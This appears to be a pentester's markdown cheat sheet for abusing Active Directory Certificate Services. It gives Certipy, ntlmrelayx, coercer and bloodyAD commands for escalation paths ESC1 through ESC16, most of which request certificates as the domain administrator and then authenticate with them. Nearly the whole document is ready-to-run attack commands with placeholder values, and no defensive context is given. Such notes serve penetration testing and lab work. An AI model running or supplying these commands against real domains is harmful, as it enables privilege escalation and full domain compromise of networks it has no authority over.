# Attacks
- [ESC1](#esc1)
- [ESC3](#esc3)
- [ESC4](#esc4)
- [ESC6](#esc6)
- [ESC7](#esc7)
- [ESC8](#esc8)
- [ESC9](#esc9)
- [ESC13](#esc13)
- [ESC14 - Scenario B](#esc14---scenario-b)
- [ESC15](#esc15)
- [ESC16](#esc16)

# Installation
https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation
```
sudo apt update && sudo apt install -y python3 python3-pip
python3 -m venv certipy-venv
source certipy-venv/bin/activate
pip install certipy-ad
```
or
```
pipx install -f "git+https://github.com/ly4k/Certipy.git"
```
# Enumeration
Find PKI Enrollment Services in Active Directory and Certificate Templates Names
```
nxc ldap ip -u username -p password -M adcs
```
Search for vulnerable certificate templates
```
certipy find -u username -p password -dc-ip ip -target dc -enabled -vulnerable -stdout
```
# Attacks
## ESC1
```
addcomputer.py domain/username:password -computer-name computer_name -computer-pass computer_password
```
```
certipy req -u computer_name -p computer_password -ca ca -target domain -template template -upn administrator -dc-ip ip
```
Or
```
certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip
```
> Sometimes if you run certipy and see `Minimum RSA Key Length              : 4096`, you need to provide `-key-size 4096`
```bash
certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip -key-size 4096
```
```
certipy auth -pfx administrator.pfx -domain domain -u username -dc-ip ip
```
New update:
> By February 2025, if the StrongCertificateBindingEnforcement registry key is not configured, domain controllers will move to Full Enforcement mode

https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16

Fix: add the sid
```
certipy req -u username -p password -ca ca -target domain -template template -upn administrator -sid <administrator sid> -dc-ip ip 
```
## ESC3
```
certipy req -u username -p password -ca ca -target domain -template template
```
```
certipy req username -p password -ca ca -target domain -template User -on-behalf-of administrator -pfx pfx_file
```
```
certipy auth -pfx administrator.pfx -dc-ip ip
```
## ESC4
```
certipy template -u username -p password -template template -save-old -dc-ip ip
```
```
certipy req -u username -p password -dc-ip ip -ca ca -target dc -template template -upn administrator
```
```
certipy auth -pfx administrator.pfx -domain domain -u administrator -dc-ip ip
```
## ESC7
```
certipy ca -ca ca -add-officer username -u username@domain -p password -dc-ip ip -dns-tcp -ns ip
```
```
certipy ca -ca ca -enable-template SubCA -u username@domain -p password -dc-ip ip -dns-tcp -ns ip
```
```
certipy req -u username@domain -p password -ca ca -target ip -template SubCA -upn username@domain
```
```
certipy ca -ca ca -issue-request request_ID -u username@domain -p password
```
```
certipy req -u username@domain -p password -ca ca -target ip -retrieve request_ID
```
```
certipy auth -pfx pfx_file -domain domain -u username -dc-ip ip
```
## ESC8
```
ntlmrelayx.py -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template template --no-http-server --no-wcf-server --no-raw-server
```
```
coercer coerce -u username -p password -l ws_ip -t dc_ip --always-continue
```
```
certipy- auth -pfx administrator.pfx
```
## ESC9
```
certipy shadow auto -u username@domain -hashes :hash -account target_username
```
```
certipy account update -u username@domain -hashes :hash -user target_username -upn administrator
```
```
certipy req -u target_username@domain -hashes :target_hash -ca ca -template template -target $DC_IP
```
```
certipy account update -u username@domain -hashes :hash -user target_username -upn target_username
```
```
certipy auth -pfx administrator.pfx -domain domain
```
## ESC13
```
certipy req -u username -p password -ca ca -target domain -template template -dc-ip ip -key-size 4096
```
```
python3 gettgtpkinit.py -cert-pfx pfx_file domain/username ccache_file -dc-ip ip -v
```
## ESC14 - Scenario B
https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82
```
bloodyAD --host dc -d domain -u username -p password set object target altSecurityIdentities -v 'X509:<RFC822>target@domain'
```
```
bloodyAD --host dc -d domain -u owned_user -p password set object target mail -v target@domain
```
```
certipy account update -u owned_user@domain -p password -user username -upn target
```
```
certipy req -u username -p password -ca ca -template template -dc-ip ip
```
```
certipy account update -u owned_user -p password -user username -upn username@domain -dc-ip ip
```
```
certipy auth -pfx pfx -dc-ip ip -user target -domain domain
```
## ESC15
```
certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template template -upn administrator@domain -sid <administrator sid> -application-policies 'Client Authentication'
```

```
certipy auth -pfx administrator.pfx -dc-ip ip -ldap-shell
```
## ESC16
We use a user that has GenericAll or GenericWrite
```
certipy account -u username@domain -p password -dc-ip ip -upn administrator -user owned_user update
```
```
certipy req -u owned_user@domain -p password -dc-ip ip -target dc -ca ca -template User -upn administrator@domain -sid <administrator sid>
```
```
certipy account -u username@domain -p password -dc-ip ip -upn owned_user -user owned_user update
```
```
certipy auth -pfx administrator.pfx -dc-ip ip -domain domain
```

# Resources
- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
- https://mayfly277.github.io/posts/GOADv2-pwning-part6/
- https://mayfly277.github.io/posts/ADCS-part14/
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/#adcs-enumeration
- https://vulndev.io/2023/07/01/vl-intercept-walkthrough/
- https://www.bulletproof.co.uk/blog/abusing-esc13-from-linux
- https://logan-goins.com/2024-05-04-ADCS/
- https://www.tarlogic.com/blog/ad-cs-esc7-attack/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-4/
- https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9
- https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82